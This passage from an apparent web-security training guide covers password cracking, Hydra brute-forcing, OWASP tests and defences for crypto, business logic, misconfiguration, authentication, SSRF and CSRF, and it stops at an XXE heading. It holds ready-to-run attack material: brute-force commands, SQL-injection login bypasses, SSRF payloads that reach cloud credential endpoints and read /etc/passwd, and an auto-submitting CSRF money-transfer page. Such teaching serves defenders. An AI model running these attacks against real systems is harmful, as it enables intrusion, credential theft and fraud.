hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Combination attack
hashcat -m 1000 -a 1 wordlist1.txt wordlist2.txt

# Mask attack (brute force with pattern)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?s
# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special

# Show cracked
hashcat -m 1000 hashes.txt --show

# Benchmark
hashcat -b
```

### Hydra (Network Protocol Attacks)

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# SMB
hydra -L users.txt -P passwords.txt smb://192.168.1.100

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# Multiple protocols
hydra -L users.txt -P pass.txt -M targets.txt ssh
```

## 2.4 Web Application Security (Continued)

### A02:2021 – Cryptographic Failures

**Sensitive Data Exposure:**

```python
#!/usr/bin/env python3
"""
Cryptographic Failures - Testing and Examples
"""

class CryptoFailureTester:
    def __init__(self, target_url):
        self.target = target_url
    
    def test_ssl_tls_weaknesses(self):
        """Test for SSL/TLS configuration issues"""
        
        import ssl
        import socket
        
        vulnerabilities = []
        
        hostname = self.target.replace('https://', '').split('/')[0]
        
        # Test weak protocols
        weak_protocols = [
            ('SSLv2', ssl.PROTOCOL_SSLv2) if hasattr(ssl, 'PROTOCOL_SSLv2') else None,
            ('SSLv3', ssl.PROTOCOL_SSLv3) if hasattr(ssl, 'PROTOCOL_SSLv3') else None,
            ('TLSv1.0', ssl.PROTOCOL_TLSv1),
            ('TLSv1.1', ssl.PROTOCOL_TLSv1_1),
        ]
        
        for proto_name, proto in [p for p in weak_protocols if p]:
            try:
                context = ssl.SSLContext(proto)
                sock = socket.create_connection((hostname, 443), timeout=5)
                ssock = context.wrap_socket(sock, server_hostname=hostname)
                
                vulnerabilities.append({
                    'type': 'Weak Protocol Supported',
                    'severity': 'HIGH',
                    'protocol': proto_name,
                    'description': f'Server supports outdated {proto_name}',
                    'remediation': 'Disable TLS 1.0 and 1.1, use only TLS 1.2+'
                })
                
                ssock.close()
            except:
                pass  # Protocol not supported (good)
        
        # Test for weak ciphers
        context = ssl.create_default_context()
        try:
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    
                    weak_ciphers = ['RC4', 'DES', '3DES', 'MD5', 'NULL', 'EXPORT']
                    if any(weak in cipher[0] for weak in weak_ciphers):
                        vulnerabilities.append({
                            'type': 'Weak Cipher Suite',
                            'severity': 'HIGH',
                            'cipher': cipher[0],
                            'description': 'Server supports weak cipher suites',
                            'remediation': 'Configure only strong cipher suites (AES-GCM)'
                        })
        except:
            pass
        
        return vulnerabilities
    
    def test_sensitive_data_in_transit(self):
        """Check if sensitive data sent over HTTP"""
        
        import requests
        
        issues = []
        
        # Check if HTTPS is enforced
        try:
            http_url = self.target.replace('https://', 'http://')
            response = requests.get(http_url, allow_redirects=False, timeout=5)
            
            if response.status_code != 301 and response.status_code != 302:
                issues.append({
                    'type': 'HTTP Not Redirected to HTTPS',
                    'severity': 'HIGH',
                    'description': 'Site accessible over unencrypted HTTP',
                    'remediation': 'Implement HTTP to HTTPS redirect'
                })
        except:
            pass
        
        # Check for HSTS header
        try:
            response = requests.get(self.target, timeout=5)
            if 'Strict-Transport-Security' not in response.headers:
                issues.append({
                    'type': 'Missing HSTS Header',
                    'severity': 'MEDIUM',
                    'description': 'HSTS not implemented',
                    'remediation': 'Add Strict-Transport-Security header'
                })
        except:
            pass
        
        return issues
    
    def test_password_storage(self, login_endpoint):
        """Test password storage practices (if accessible)"""
        
        # This would require access to the application's source code
        # or database. Examples of what to check:
        
        checks = {
            'weak_hashing': [
                'Check for MD5 password hashing',
                'Check for SHA-1 password hashing',
                'Check for unsalted hashes',
                'Check for custom crypto algorithms'
            ],
            'plaintext_storage': [
                'Check database for plaintext passwords',
                'Check configuration files for passwords',
                'Check logs for password leakage'
            ],
            'weak_encryption': [
                'Check for weak encryption algorithms (DES, 3DES)',
                'Check for hardcoded encryption keys',
                'Check for insufficient key length'
            ]
        }
        
        return checks

# Example of GOOD cryptographic practices
class SecureCryptoImplementation:
    """
    Demonstrates secure cryptographic implementation
    """
    
    def hash_password(self, password: str) -> str:
        """✅ SECURE: Use bcrypt for password hashing"""
        import bcrypt
        
        salt = bcrypt.gensalt(rounds=12)  # Cost factor 12
        hashed = bcrypt.hashpw(password.encode(), salt)
        
        return hashed.decode()
    
    def verify_password(self, password: str, hashed: str) -> bool:
        """✅ SECURE: Constant-time password verification"""
        import bcrypt
        
        return bcrypt.checkpw(password.encode(), hashed.encode())
    
    def encrypt_sensitive_data(self, data: str, key: bytes) -> dict:
        """✅ SECURE: Use AES-256-GCM for encryption"""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        import os
        
        # Generate random nonce (12 bytes for GCM)
        nonce = os.urandom(12)
        
        # Encrypt with authenticated encryption
        aesgcm = AESGCM(key)  # key must be 32 bytes for AES-256
        ciphertext = aesgcm.encrypt(nonce, data.encode(), None)
        
        return {
            'ciphertext': ciphertext.hex(),
            'nonce': nonce.hex(),
            'algorithm': 'AES-256-GCM'
        }
    
    def decrypt_sensitive_data(self, encrypted_data: dict, key: bytes) -> str:
        """✅ SECURE: Decrypt with authentication verification"""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        nonce = bytes.fromhex(encrypted_data['nonce'])
        ciphertext = bytes.fromhex(encrypted_data['ciphertext'])
        
        aesgcm = AESGCM(key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        
        return plaintext.decode()
    
    def generate_secure_token(self, length: int = 32) -> str:
        """✅ SECURE: Cryptographically secure random tokens"""
        import secrets
        
        return secrets.token_urlsafe(length)
    
    def generate_encryption_key(self) -> bytes:
        """✅ SECURE: Generate 256-bit encryption key"""
        import os
        
        return os.urandom(32)  # 256 bits

# BAD vs GOOD examples
def demonstrate_crypto_failures():
    """Show common cryptographic mistakes"""
    
    print("❌ BAD EXAMPLES:")
    
    # BAD: MD5 for passwords
    import hashlib
    password = "user_password"
    bad_hash = hashlib.md5(password.encode()).hexdigest()
    print(f"MD5 hash (INSECURE): {bad_hash}")
    
    # BAD: Hardcoded encryption key
    SECRET_KEY = b'0123456789abcdef'  # NEVER DO THIS!
    
    # BAD: ECB mode (no diffusion)
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    
    cipher = Cipher(
        algorithms.AES(SECRET_KEY),
        modes.ECB(),  # INSECURE MODE!
        backend=default_backend()
    )
    
    print("\n✅ GOOD EXAMPLES:")
    
    secure_crypto = SecureCryptoImplementation()
    
    # GOOD: bcrypt for passwords
    password = "user_password"
    hashed = secure_crypto.hash_password(password)
    print(f"bcrypt hash (SECURE): {hashed[:50]}...")
    
    # GOOD: Proper encryption
    key = secure_crypto.generate_encryption_key()
    encrypted = secure_crypto.encrypt_sensitive_data("Sensitive Data", key)
    print(f"AES-256-GCM encrypted: {encrypted['ciphertext'][:50]}...")
    
    # GOOD: Secure random tokens
    token = secure_crypto.generate_secure_token()
    print(f"Secure token: {token[:30]}...")

if __name__ == "__main__":
    demonstrate_crypto_failures()
```

### A04:2021 – Insecure Design

**Business Logic Vulnerabilities:**

```python
#!/usr/bin/env python3
"""
Business Logic Vulnerability Examples
"""

# ❌ BAD: Race condition in payment processing
class InsecurePaymentProcessor:
    def __init__(self):
        self.user_balance = 1000
    
    def process_payment(self, amount):
        # Race condition: Check and deduct not atomic
        if self.user_balance >= amount:
            # Attacker can exploit timing here!
            import time
            time.sleep(0.1)  # Simulating processing time
            
            self.user_balance -= amount
            return True
        return False
    
    # Attack: Send multiple simultaneous requests
    # All check balance before any deducts
    # Result: Negative balance!

# ✅ GOOD: Atomic operation with locking
class SecurePaymentProcessor:
    def __init__(self):
        self.user_balance = 1000
        self.lock = threading.Lock()
    
    def process_payment(self, amount):
        with self.lock:  # Atomic operation
            if self.user_balance >= amount:
                self.user_balance -= amount
                return True
            return False

# ❌ BAD: Price manipulation
class InsecureShoppingCart:
    def checkout(self, items):
        # Client sends total price - can be manipulated!
        total = sum(item['price'] for item in items)
        return self.process_payment(total)

# ✅ GOOD: Server-side price calculation
class SecureShoppingCart:
    def __init__(self):
        self.product_prices = {
            'item1': 100,
            'item2': 200,
            'item3': 300
        }
    
    def checkout(self, items):
        # Calculate total server-side
        total = 0
        for item in items:
            product_id = item['id']
            quantity = item['quantity']
            
            # Verify quantity is reasonable
            if quantity < 1 or quantity > 100:
                raise ValueError("Invalid quantity")
            
            # Use server-side price (can't be manipulated)
            price = self.product_prices.get(product_id, 0)
            total += price * quantity
        
        return self.process_payment(total)

# ❌ BAD: Insufficient anti-automation
class InsecureVotingSystem:
    def vote(self, user_id, candidate):
        # No rate limiting - can vote multiple times rapidly
        self.record_vote(user_id, candidate)

# ✅ GOOD: Rate limiting and CAPTCHA
class SecureVotingSystem:
    def __init__(self):
        self.vote_timestamps = {}
        self.votes_per_user = {}
    
    def vote(self, user_id, candidate, captcha_token):
        # Verify CAPTCHA
        if not self.verify_captcha(captcha_token):
            raise ValueError("Invalid CAPTCHA")
        
        # Check rate limit (one vote per hour)
        current_time = time.time()
        last_vote = self.vote_timestamps.get(user_id, 0)
        
        if current_time - last_vote < 3600:
            raise ValueError("Rate limit exceeded")
        
        # Check vote count (one vote per user)
        if user_id in self.votes_per_user:
            raise ValueError("Already voted")
        
        # Record vote
        self.record_vote(user_id, candidate)
        self.vote_timestamps[user_id] = current_time
        self.votes_per_user[user_id] = candidate

# Business Logic Testing
class BusinessLogicTester:
    """
    Test for business logic vulnerabilities
    """
    
    def test_price_manipulation(self, checkout_endpoint):
        """Test if prices can be manipulated"""
        
        # Normal request
        normal_request = {
            'items': [
                {'id': 'item1', 'price': 100, 'quantity': 1}
            ]
        }
        
        # Manipulated request
        manipulated_request = {
            'items': [
                {'id': 'item1', 'price': 1, 'quantity': 1}  # Changed price!
            ]
        }
        
        # Send both and compare
        normal_response = requests.post(checkout_endpoint, json=normal_request)
        manipulated_response = requests.post(checkout_endpoint, json=manipulated_request)
        
        if manipulated_response.status_code == 200:
            return {
                'vulnerable': True,
                'type': 'Price Manipulation',
                'description': 'Client-side price can be modified'
            }
    
    def test_race_condition(self, transfer_endpoint):
        """Test for race conditions"""
        
        import concurrent.futures
        
        # Send multiple simultaneous requests
        def make_transfer():
            return requests.post(
                transfer_endpoint,
                json={'amount': 100, 'to': 'attacker'}
            )
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_transfer) for _ in range(10)]
            results = [f.result() for f in futures]
        
        # If more than one succeeds when balance only allows one
        successes = sum(1 for r in results if r.status_code == 200)
        
        if successes > 1:
            return {
                'vulnerable': True,
                'type': 'Race Condition',
                'description': f'{successes} transfers succeeded simultaneously'
            }
    
    def test_quantity_manipulation(self, order_endpoint):
        """Test negative quantity or overflow"""
        
        tests = [
            {'quantity': -1, 'description': 'Negative quantity'},
            {'quantity': 0, 'description': 'Zero quantity'},
            {'quantity': 999999999, 'description': 'Excessive quantity'},
            {'quantity': 2147483648, 'description': 'Integer overflow'}
        ]
        
        vulnerabilities = []
        
        for test in tests:
            response = requests.post(
                order_endpoint,
                json={'item_id': 'item1', 'quantity': test['quantity']}
            )
            
            if response.status_code == 200:
                vulnerabilities.append({
                    'vulnerable': True,
                    'type': 'Quantity Manipulation',
                    'test': test['description'],
                    'quantity': test['quantity']
                })
        
        return vulnerabilities
```

### A05:2021 – Security Misconfiguration

**Common Misconfigurations:**

```bash
#!/bin/bash
# Security Misconfiguration Scanner

TARGET="https://target.com"

echo "[*] Scanning for security misconfigurations on $TARGET"

# Check 1: Directory Listing
echo "[+] Checking for directory listing..."
curl -s "$TARGET/" | grep -i "Index of" && echo "⚠️ Directory listing enabled"

# Check 2: Default credentials
echo "[+] Testing default credentials..."
curl -s -X POST "$TARGET/admin/login" \
    -d "username=admin&password=admin" | grep -i "success" && echo "⚠️ Default credentials work!"

# Check 3: Information disclosure
echo "[+] Checking for info disclosure..."
curl -s "$TARGET" | grep -i "version" && echo "⚠️ Version information disclosed"

# Check 4: Unnecessary HTTP methods
echo "[+] Checking HTTP methods..."
curl -X OPTIONS -I "$TARGET" | grep "Allow:" && echo "⚠️ Check if methods like PUT, DELETE are allowed"

# Check 5: Missing security headers
echo "[+] Checking security headers..."
HEADERS=$(curl -I -s "$TARGET")

echo "$HEADERS" | grep -i "X-Frame-Options" || echo "❌ Missing X-Frame-Options"
echo "$HEADERS" | grep -i "X-Content-Type-Options" || echo "❌ Missing X-Content-Type-Options"
echo "$HEADERS" | grep -i "Strict-Transport-Security" || echo "❌ Missing HSTS"
echo "$HEADERS" | grep -i "Content-Security-Policy" || echo "❌ Missing CSP"

# Check 6: Error messages
echo "[+] Checking error messages..."
curl -s "$TARGET/nonexistent" | grep -i "stack trace\|error in line\|warning:" && echo "⚠️ Detailed error messages"

# Check 7: Backup files
echo "[+] Checking for backup files..."
for file in ".git/config" ".env" "config.php.bak" "web.config" ".DS_Store"; do
    curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file" | grep "200" && echo "⚠️ Found: $file"
done

# Check 8: Admin panels
echo "[+] Checking for admin panels..."
for path in "admin" "administrator" "admin.php" "phpmyadmin" "cpanel"; do
    curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path" | grep "200\|301\|302" && echo "⚠️ Found: /$path"
done

# Check 9: CORS misconfiguration
echo "[+] Checking CORS..."
CORS=$(curl -s -H "Origin: http://evil.com" -I "$TARGET" | grep "Access-Control-Allow-Origin")
echo "$CORS" | grep "*" && echo "⚠️ CORS allows all origins"

# Check 10: Server version
echo "[+] Checking server version..."
curl -I -s "$TARGET" | grep "Server:" && echo "⚠️ Server version disclosed"
```

### A07:2021 – Identification and Authentication Failures

**Authentication Bypass Techniques:**

```python
#!/usr/bin/env python3
"""
Authentication Testing and Bypass Techniques
"""

class AuthenticationTester:
    def __init__(self, target_url):
        self.target = target_url
    
    def test_sql_injection_auth_bypass(self, login_endpoint):
        """Test SQL injection in authentication"""
        
        payloads = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin'--", "password": ""},
            {"username": "admin' #", "password": ""},
            {"username": "' OR 1=1--", "password": ""},
            {"username": "admin", "password": "' OR '1'='1"},
        ]
        
        for payload in payloads:
            response = requests.post(
                f"{self.target}{login_endpoint}",
                data=payload
            )
            
            # Check for successful login indicators
            if any(indicator in response.text.lower() for indicator in 
                   ['welcome', 'dashboard', 'logout', 'success']):
                return {
                    'vulnerable': True,
                    'type': 'SQL Injection Authentication Bypass',
                    'payload': payload
                }
        
        return {'vulnerable': False}
    
    def test_weak_password_policy(self, registration_endpoint):
        """Test password policy strength"""
        
        weak_passwords = [
            "123456",
            "password",
            "admin",
            "12345678",
            "a",  # Single character
            "abc"  # Too short
        ]
        
        accepted_weak = []
        
        for pwd in weak_passwords:
            response = requests.post(
                f"{self.target}{registration_endpoint}",
                json={
                    'username': 'testuser',
                    'password': pwd,
                    'email': 'test@example.com'
                }
            )
            
            if response.status_code == 200 or 'success' in response.text.lower():
                accepted_weak.append(pwd)
        
        if accepted_weak:
            return {
                'vulnerable': True,
                'type': 'Weak Password Policy',
                'weak_passwords_accepted': accepted_weak
            }
    
    def test_username_enumeration(self, login_endpoint):
        """Test if application leaks valid usernames"""
        
        # Test with valid username (common)
        response_valid = requests.post(
            f"{self.target}{login_endpoint}",
            data={'username': 'admin', 'password': 'wrongpass'}
        )
        
        # Test with invalid username
        response_invalid = requests.post(
            f"{self.target}{login_endpoint}",
            data={'username': 'nonexistentuser99999', 'password': 'wrongpass'}
        )
        
        # Different responses = username enumeration possible
        if response_valid.text != response_invalid.text:
            return {
                'vulnerable': True,
                'type': 'Username Enumeration',
                'description': 'Different error messages for valid/invalid usernames',
                'valid_message': response_valid.text[:100],
                'invalid_message': response_invalid.text[:100]
            }
    
    def test_rate_limiting(self, login_endpoint):
        """Test for brute force protection"""
        
        # Send multiple failed login attempts
        attempts = 20
        blocked = False
        
        for i in range(attempts):
            response = requests.post(
                f"{self.target}{login_endpoint}",
                data={'username': 'admin', 'password': f'wrong{i}'}
            )
            
            # Check if blocked
            if response.status_code == 429 or 'too many' in response.text.lower():
                blocked = True
                break
        
        if not blocked:
            return {
                'vulnerable': True,
                'type': 'No Rate Limiting',
                'description': f'Accepted {attempts} failed login attempts without blocking'
            }
    
    def test_session_fixation(self):
        """Test for session fixation vulnerability"""
        
        # Get a session before login
        session = requests.Session()
        response = session.get(f"{self.target}/login")
        
        # Extract session cookie
        session_before = session.cookies.get('SESSIONID')
        
        # Login
        session.post(
            f"{self.target}/login",
            data={'username': 'testuser', 'password': 'testpass'}
        )
        
        # Check if session ID changed
        session_after = session.cookies.get('SESSIONID')
        
        if session_before == session_after:
            return {
                'vulnerable': True,
                'type': 'Session Fixation',
                'description': 'Session ID not regenerated after login'
            }
    
    def test_jwt_vulnerabilities(self, jwt_token):
        """Test JWT security"""
        
        import jwt as pyjwt
        import base64
        
        vulnerabilities = []
        
        # Decode without verification
        try:
            header = pyjwt.get_unverified_header(jwt_token)
            payload = pyjwt.decode(jwt_token, options={"verify_signature": False})
            
            # Check 1: Algorithm none attack
            if header.get('alg') == 'none':
                vulnerabilities.append({
                    'type': 'JWT Algorithm None',
                    'severity': 'CRITICAL',
                    'description': 'JWT accepts "none" algorithm'
                })
            
            # Check 2: Weak secret
            weak_secrets = ['secret', 'password', '123456', 'jwt']
            for secret in weak_secrets:
                try:
                    pyjwt.decode(jwt_token, secret, algorithms=['HS256'])
                    vulnerabilities.append({
                        'type': 'JWT Weak Secret',
                        'severity': 'CRITICAL',
                        'secret': secret
                    })
                    break
                except:
                    pass
            
            # Check 3: No expiration
            if 'exp' not in payload:
                vulnerabilities.append({
                    'type': 'JWT No Expiration',
                    'severity': 'MEDIUM',
                    'description': 'JWT does not expire'
                })
        
        except Exception as e:
            pass
        
        return vulnerabilities

# Secure authentication implementation
class SecureAuthentication:
    """Demonstrates secure authentication practices"""
    
    def __init__(self):
        self.failed_attempts = {}
        self.lockout_threshold = 5
        self.lockout_duration = 900  # 15 minutes
    
    def login(self, username, password, ip_address):
        """✅ SECURE: Comprehensive login implementation"""
        
        import bcrypt
        import time
        
        # Check account lockout
        if self.is_locked_out(username, ip_address):
            return {
                'success': False,
                'message': 'Account temporarily locked. Try again later.',
                'locked_until': self.get_lockout_expiry(username, ip_address)
            }
        
        # Retrieve user from database
        user = self.get_user(username)
        
        if not user:
            # Generic error message (no username enumeration)
            self.record_failed_attempt(username, ip_address)
            time.sleep(1)  # Timing attack mitigation
            return {
                'success': False,
                'message': 'Invalid credentials'
            }
        
        # Verify password
        if not bcrypt.checkpw(password.encode(), user['password_hash'].encode()):
            self.record_failed_attempt(username, ip_address)
            time.sleep(1)  # Constant time
            return {
                'success': False,
                'message': 'Invalid credentials'
            }
        
        # Check if MFA required
        if user['mfa_enabled']:
            return {
                'success': False,
                'requires_mfa': True,
                'session_id': self.create_pre_auth_session(user)
            }
        
        # Successful login
        self.clear_failed_attempts(username, ip_address)
        session_id = self.create_session(user)
        
        return {
            'success': True,
            'session_id': session_id,
            'user': {
                'id': user['id'],
                'username': user['username'],
                'roles': user['roles']
            }
        }
    
    def is_locked_out(self, username, ip_address):
        """Check if account/IP is locked out"""
        
        import time
        
        key = f"{username}:{ip_address}"
        
        if key not in self.failed_attempts:
            return False
        
        attempts = self.failed_attempts[key]
        
        if attempts['count'] >= self.lockout_threshold:
            if time.time() - attempts['first_attempt'] < self.lockout_duration:
                return True
            else:
                # Lockout expired
                del self.failed_attempts[key]
                return False
        
        return False
```

### A10:2021 – Server-Side Request Forgery (SSRF)

**SSRF Attack and Defense:**

```python
#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Testing and Prevention
"""

class SSRFTester:
    def __init__(self, target_url):
        self.target = target_url
    
    def test_basic_ssrf(self, endpoint):
        """Test for basic SSRF vulnerability"""
        
        # Internal IP addresses to test
        internal_targets = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://172.16.0.1'
        ]
        
        vulnerabilities = []
        
        for target in internal_targets:
            # Test URL parameter
            response = requests.get(
                f"{self.target}{endpoint}",
                params={'url': target},
                timeout=10
            )
            
            # Check if request was made to internal resource
            if response.status_code == 200 and len(response.text) > 0:
                vulnerabilities.append({
                    'vulnerable': True,
                    'type': 'SSRF',
                    'target': target,
                    'endpoint': endpoint,
                    'response_length': len(response.text)
                })
        
        return vulnerabilities
    
    def test_cloud_metadata_ssrf(self, endpoint):
        """Test for cloud metadata access via SSRF"""
        
        # AWS metadata endpoints
        aws_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/'
        ]
        
        # GCP metadata endpoints
        gcp_endpoints = [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata/computeMetadata/v1/'
        ]
        
        # Azure metadata endpoints
        azure_endpoints = [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
        ]
        
        all_endpoints = aws_endpoints + gcp_endpoints + azure_endpoints
        
        for metadata_url in all_endpoints:
            response = requests.get(
                f"{self.target}{endpoint}",
                params={'url': metadata_url},
                timeout=10
            )
            
            # Check for cloud metadata in response
            if any(indicator in response.text.lower() for indicator in 
                   ['credentials', 'access_key', 'secret', 'token', 'ami-id']):
                return {
                    'vulnerable': True,
                    'type': 'Cloud Metadata SSRF',
                    'severity': 'CRITICAL',
                    'metadata_url': metadata_url,
                    'leaked_data': response.text[:200]
                }
    
    def test_ssrf_bypass_techniques(self, endpoint):
        """Test SSRF filter bypass techniques"""
        
        bypass_payloads = [
            # IP encoding variations
            'http://2130706433',  # Decimal encoding of 127.0.0.1
            'http://0x7f000001',  # Hex encoding
            'http://0177.0000.0000.0001',  # Octal encoding
            'http://127.1',  # Short form
            
            # DNS tricks
            'http://localtest.me',  # Resolves to 127.0.0.1
            'http://127.0.0.1.nip.io',  # Wildcard DNS
            
            # URL parser confusion
            'http://evil.com@127.0.0.1',
            'http://127.0.0.1#evil.com',
            'http://evil.com#@127.0.0.1',
            
            # Protocol smuggling
            'file:///etc/passwd',
            'gopher://127.0.0.1:11211',  # Memcached
            'dict://127.0.0.1:6379',  # Redis
        ]
        
        for payload in bypass_payloads:
            try:
                response = requests.get(
                    f"{self.target}{endpoint}",
                    params={'url': payload},
                    timeout=5
                )
                
                if response.status_code == 200:
                    return {
                        'vulnerable': True,
                        'type': 'SSRF Filter Bypass',
                        'bypass_payload': payload
                    }
            except:
                pass

# Secure SSRF prevention
class SSRFPrevention:
    """Demonstrates SSRF prevention techniques"""
    
    def __init__(self):
        # Whitelist of allowed domains
        self.allowed_domains = [
            'api.example.com',
            'cdn.example.com'
        ]
        
        # Blacklist of dangerous IPs/ranges
        self.blocked_ranges = [
            '127.0.0.0/8',  # Loopback
            '10.0.0.0/8',  # Private
            '172.16.0.0/12',  # Private
            '192.168.0.0/16',  # Private
            '169.254.0.0/16',  # Link-local
            '::1/128',  # IPv6 loopback
            'fc00::/7',  # IPv6 private
        ]
    
    def validate_url(self, url):
        """✅ SECURE: Comprehensive URL validation"""
        
        from urllib.parse import urlparse
        import ipaddress
        import socket
        
        # Parse URL
        try:
            parsed = urlparse(url)
        except:
            raise ValueError("Invalid URL format")
        
        # Check protocol (only allow HTTP/HTTPS)
        if parsed.scheme not in ['http', 'https']:
            raise ValueError(f"Protocol {parsed.scheme} not allowed")
        
        # Check domain is in whitelist
        if parsed.hostname not in self.allowed_domains:
            raise ValueError(f"Domain {parsed.hostname} not in whitelist")
        
        # Resolve hostname to IP
        try:
            ip = socket.gethostbyname(parsed.hostname)
        except socket.gaierror:
            raise ValueError("Could not resolve hostname")
        
        # Check if IP is in blocked ranges
        ip_obj = ipaddress.ip_address(ip)
        
        for blocked_range in self.blocked_ranges:
            network = ipaddress.ip_network(blocked_range)
            if ip_obj in network:
                raise ValueError(f"IP {ip} is in blocked range {blocked_range}")
        
        # Additional checks
        if ip_obj.is_private:
            raise ValueError("Private IP addresses not allowed")
        
        if ip_obj.is_loopback:
            raise ValueError("Loopback addresses not allowed")
        
        if ip_obj.is_link_local:
            raise ValueError("Link-local addresses not allowed")
        
        return True
    
    def safe_fetch_url(self, url):
        """✅ SECURE: Safely fetch external URL"""
        
        import requests
        
        # Validate URL first
        self.validate_url(url)
        
        # Make request with safety measures
        try:
            response = requests.get(
                url,
                timeout=5,  # Prevent hang
                allow_redirects=False,  # Prevent redirect to internal
                verify=True,  # Verify SSL
                headers={'User-Agent': 'MyApp/1.0'}
            )
            
            # Check response size (prevent DoS)
            if len(response.content) > 10 * 1024 * 1024:  # 10MB limit
                raise ValueError("Response too large")
            
            return response.content
            
        except requests.exceptions.RequestException as e:
            raise ValueError(f"Request failed: {e}")

# Example usage
if __name__ == "__main__":
    # Test for SSRF
    tester = SSRFTester("http://vulnerable-site.com")
    vulns = tester.test_basic_ssrf("/fetch?url=")
    
    for vuln in vulns:
        print(f"[!] SSRF vulnerability found: {vuln}")
    
    # Secure implementation
    prevention = SSRFPrevention()
    
    try:
        # This will fail - internal IP
        prevention.validate_url("http://127.0.0.1/admin")
    except ValueError as e:
        print(f"[+] Blocked: {e}")
    
    try:
        # This will succeed - whitelisted domain
        prevention.validate_url("http://api.example.com/data")
        print("[+] URL validated successfully")
    except ValueError as e:
        print(f"[-] Validation failed: {e}")
```

[Continuing with remaining OWASP items, CSRF, XXE, and advanced web attacks...]
### Cross-Site Request Forgery (CSRF)

**CSRF Attack Demonstration:**

```html
<!-- Attacker's malicious page -->
<!DOCTYPE html>
<html>
<head>
    <title>Free Bitcoin!</title>
</head>
<body>
    <h1>Click here for free Bitcoin!</h1>
    
    <!-- Hidden form that auto-submits -->
    <form id="csrf" action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
    
    <script>
        // Auto-submit when page loads
        document.getElementById('csrf').submit();
    </script>
    
    <!-- Alternative: Image-based CSRF for GET requests -->
    <img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">
</body>
</html>
```

**CSRF Prevention:**

```python
#!/usr/bin/env python3
"""
CSRF Protection Implementation
"""
import secrets
import hmac
import hashlib
from flask import Flask, session, request, abort

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

class CSRFProtection:
    """Comprehensive CSRF protection"""
    
    @staticmethod
    def generate_token(session_id):
        """Generate CSRF token"""
        secret = app.secret_key.encode()
        message = f"{session_id}:{secrets.token_hex(16)}".encode()
        
        # Create HMAC signature
        signature = hmac.new(secret, message, hashlib.sha256).hexdigest()
        
        token = f"{message.decode()}:{signature}"
        return token
    
    @staticmethod
    def validate_token(token, session_id):
        """Validate CSRF token"""
        try:
            parts = token.split(':')
            if len(parts) != 3:
                return False
            
            received_session, random_part, signature = parts
            
            # Verify session matches
            if received_session != session_id:
                return False
            
            # Verify signature
            secret = app.secret_key.encode()
            message = f"{received_session}:{random_part}".encode()
            expected_sig = hmac.new(secret, message, hashlib.sha256).hexdigest()
            
            # Constant-time comparison
            return hmac.compare_digest(signature, expected_sig)
            
        except:
            return False
    
    @staticmethod
    def check_referer(request):
        """Additional CSRF check via Referer header"""
        referer = request.headers.get('Referer', '')
        allowed_origins = ['https://example.com']
        
        return any(referer.startswith(origin) for origin in allowed_origins)

# Decorator for CSRF protection
def csrf_protect(f):
    """CSRF protection decorator"""
    from functools import wraps
    
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.method == 'POST':
            # Get token from form or header
            token = request.form.get('csrf_token') or \
                    request.headers.get('X-CSRF-Token')
            
            session_id = session.get('id')
            
            if not token or not session_id:
                abort(403, "CSRF token missing")
            
            if not CSRFProtection.validate_token(token, session_id):
                abort(403, "Invalid CSRF token")
            
            # Additional check
            if not CSRFProtection.check_referer(request):
                abort(403, "Invalid referer")
        
        return f(*args, **kwargs)
    
    return decorated_function

# Example usage
@app.route('/transfer', methods=['GET', 'POST'])
@csrf_protect
def transfer():
    if request.method == 'GET':
        # Generate token for form
        csrf_token = CSRFProtection.generate_token(session['id'])
        return f'''
            <form method="POST">
                <input type="hidden" name="csrf_token" value="{csrf_token}">
                <input name="to" placeholder="Recipient">
                <input name="amount" placeholder="Amount">
                <button type="submit">Transfer</button>
            </form>
        '''
    else:
        # Process transfer (CSRF-protected)
        return "Transfer successful"

# SameSite cookie configuration
@app.after_request
def set_csrf_cookie(response):
    """Set SameSite cookie attribute"""
    response.set_cookie(
        'session',
        value=session.get('id', ''),
        secure=True,  # HTTPS only
        httponly=True,  # No JavaScript access
        samesite='Strict'  # CSRF protection
    )
    return response
```

### XML External Entity (XXE) Attacks

**XXE Exploitation:**

```python
#!/usr/bin/env python3
"""
XXE (XML External Entity) Attack Demonstration
"""

# Vulnerable XML parser
import xml.etree.ElementTree as ET

def vulnerable_xml_parser(xml_data):
    """❌ VULNERABLE: Parses XML without disabling entities"""
    try:
        root = ET.fromstring(xml_data)
        return ET.tostring(root, encoding='unicode')
    except Exception as e:
        return f"Error: {e}"

# XXE Attack payloads
